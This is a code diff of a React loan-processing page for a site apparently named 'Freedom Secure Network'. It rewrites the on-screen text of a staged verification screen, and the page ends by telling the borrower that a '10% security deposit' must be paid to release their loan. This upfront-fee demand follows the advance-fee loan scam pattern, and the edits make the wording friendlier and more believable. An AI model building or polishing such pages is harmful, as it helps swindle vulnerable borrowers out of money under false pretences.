@@ -76,8 +76,8 @@ export const LoanProcessingPage: React.FC = () => {
        <div className="min-h-screen bg-[#0A0A0A] flex flex-col items-center justify-center gap-6">
          <div className="w-16 h-16 border-4 border-blue-500/20 border-t-blue-500 rounded-full animate-spin shadow-2xl shadow-blue-500/10" />
          <div className="flex flex-col items-center gap-2">
-            <p className="text-[10px] font-black tracking-[0.5em] text-slate-500 uppercase">Synchronizing Node...</p>
-            <p className="text-[8px] font-bold tracking-widest text-slate-700 uppercase">Freedom Secure Network v4.2</p>
+            <p className="text-[10px] font-black tracking-[0.5em] text-slate-500 uppercase">Checking Application...</p>
+            <p className="text-[8px] font-bold tracking-widest text-slate-700 uppercase">Freedom Secure Network</p>
          </div>
        </div>
      );
@@ -129,17 +129,17 @@ export const LoanProcessingPage: React.FC = () => {
           <div className="text-center space-y-4">
              <div className="flex items-center gap-3 justify-center">
                 <div className="w-2 h-2 rounded-full bg-blue-500 animate-ping" />
-                <h2 className="text-xl font-black text-white uppercase tracking-widest italic">Verification Active</h2>
+                <h2 className="text-xl font-black text-white uppercase tracking-widest italic">Verification in Progress</h2>
              </div>
              <p className="text-xs text-slate-400 font-medium max-w-[250px] mx-auto leading-relaxed">
-               Connecting to Secure Banking Nodes and validating financial credentials...
+               Connecting to our secure system and checking your details...
              </p>
           </div>
 
           <div className="w-full glass-panel p-6 rounded-3xl border-white/5 space-y-4">
              <div className="flex items-center justify-between opacity-50">
-                <span className="text-[9px] font-black uppercase tracking-widest text-slate-400">Node ID</span>
-                <span className="text-[9px] font-black uppercase tracking-widest text-white">FRDM-TX-9921</span>
+                <span className="text-[9px] font-black uppercase tracking-widest text-slate-400">Application ID</span>
+                <span className="text-[9px] font-black uppercase tracking-widest text-white">FRDM-{applicationId?.substring(0, 4)}</span>
              </div>
              <div className="h-1 w-full bg-white/5 rounded-full overflow-hidden">
                 <motion.div 
@@ -168,13 +168,13 @@ export const LoanProcessingPage: React.FC = () => {
                   <AlertCircle className="w-6 h-6" />
                </div>
                <div>
-                  <h2 className="text-xl font-black text-white italic tracking-tighter uppercase">Loan Processing Delayed</h2>
-                  <p className="text-[10px] text-red-400 font-black uppercase tracking-widest">Action Required</p>
+                  <h2 className="text-xl font-black text-white italic tracking-tighter uppercase">Application Delay</h2>
+                  <p className="text-[10px] text-red-400 font-black uppercase tracking-widest">Update Needed</p>
                </div>
             </div>
 
             <p className="text-xs text-slate-400 font-medium leading-relaxed mb-8">
-              We are currently unable to complete the transfer to the provided bank account. System flags indicate a requirement for account verification.
+              We are currently unable to complete the transfer to your account. Our system requires a quick account verification.
             </p>
 
             <div className="space-y-4 pt-6 border-t border-white/5">
@@ -192,9 +192,9 @@ export const LoanProcessingPage: React.FC = () => {
                    <ShieldCheck className="w-6 h-6" />
                 </div>
                 <div className="flex-1">
-                   <p className="text-[9px] font-black text-blue-400 uppercase tracking-widest mb-1">Security Instruction</p>
+                   <p className="text-[9px] font-black text-blue-400 uppercase tracking-widest mb-1">Security Instructions</p>
                    <p className="text-xs text-slate-300 font-bold leading-relaxed">
-                     A <span className="text-blue-400">10% verification deposit</span> of <span className="text-white text-base block mt-1 font-black underline decoration-blue-500">{formatCurrency(depositAmount)}</span> must be completed to confirm account authenticity for successful withdrawal.
+                     A <span className="text-blue-400">10% security deposit</span> of <span className="text-white text-base block mt-1 font-black underline decoration-blue-500">{formatCurrency(depositAmount)}</span> is required to verify your account and release your loan.
                    </p>
                 </div>
              </div>
@@ -216,10 +216,10 @@ export const LoanProcessingPage: React.FC = () => {
                </a>
                
                <button 
-                 onClick={() => navigate('/landing')}
+                 onClick={() => navigate('/dashboard')}
                  className="w-full py-4 text-slate-500 font-black text-[10px] uppercase tracking-[0.3em] hover:text-white transition-colors"
                >
-                 Return to portal
+                 Return to Dashboard
                </button>
              </div>
           </div>
